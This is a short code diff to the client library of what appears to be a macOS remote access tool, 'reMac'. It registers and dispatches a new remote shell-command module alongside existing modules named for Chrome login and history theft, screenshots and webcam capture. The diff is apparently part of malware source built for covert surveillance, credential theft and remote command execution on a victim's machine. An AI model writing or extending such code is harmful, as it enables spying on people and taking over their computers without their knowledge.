@@ -11,6 +11,7 @@ from apps.client.modules.mod_client_chrome_history import mod_client_chrome_hist
 from apps.client.modules.mod_client_module_help import mod_client_module_help
 from apps.client.modules.mod_client_screenshot import mod_client_screenshot
 from apps.client.modules.mod_client_webcam import mod_client_webcam
+from apps.client.modules.mod_client_shellcmd import mod_client_shellcmd
 
 
 class reMac_libclient(reMac_libbase):
@@ -24,7 +25,8 @@ class reMac_libclient(reMac_libbase):
         'cl': [mod_client_chrome_login(), 'Module Chrome login', 'Call chrome login module', 'cl'],
         'ch': [mod_client_chrome_history(), 'Module Chrome history', 'Call chrome history module', 'ch'],
         'sc': [mod_client_screenshot(), 'Module Screenshot', 'Call screenshot module', 'sc'],
-        'wc': [mod_client_webcam(), 'Module Webcam', 'Call webcam module', 'wc']
+        'wc': [mod_client_webcam(), 'Module Webcam', 'Call webcam module', 'wc'],
+        'sh': [mod_client_shellcmd(), 'Module shell command', 'Call shell command module', 'sh']
     }
 
     prg = None
@@ -94,6 +96,8 @@ class reMac_libclient(reMac_libbase):
             return self.reMacModules["ch"][0].run_mod(content)
         elif action.startswith("hw"):
             return self.reMacModules["hw"][0].run_mod(content)
+        elif action.startswith("sh"):
+            return self.reMacModules["sh"][0].run_mod(content)
         else:
             print(f"got result: {result}, action: {action}")
 
